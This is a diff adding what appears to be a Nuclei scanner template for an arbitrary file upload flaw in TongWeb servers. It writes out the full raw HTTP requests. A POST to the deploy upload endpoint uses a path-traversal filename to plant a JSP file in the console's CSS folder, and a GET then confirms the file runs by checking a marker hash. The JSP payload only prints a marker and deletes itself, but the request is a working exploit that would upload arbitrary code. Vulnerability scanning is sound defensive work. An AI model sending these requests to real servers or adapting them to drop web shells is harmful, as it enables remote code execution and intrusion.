@@ -1,0 +1,37 @@
+id: tongweb-server-upload-fileupload
+
+info:
+  name: tongweb-server-upload-fileupload
+  author: tongweb-server-upload-fileupload
+  severity: high
+  tags: tongweb
+
+http:
+  - raw:
+      - |
+        POST /heimdall/deploy/upload?method=upload HTTP/1.1
+        Host: 
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+
+        ------WebKitFormBoundary8UaANmWAgM4BqBSs
+        Content-Disposition: form-data; name="file"; filename="../../applications/console/css/12462332j12.jsp"
+
+        <%
+        out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
+        new java.io.File(application.getRealPath(request.getServletPath())).delete();
+        %>
+        ------WebKitFormBoundary8UaANmWAgM4BqBSs--
+      - |
+        GET /console/css/12462332j12.jsp HTTP/1.1
+        Host: 
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2==200 && contains_all(body_2,"e165421110ba03099a1c0393373c5b43")
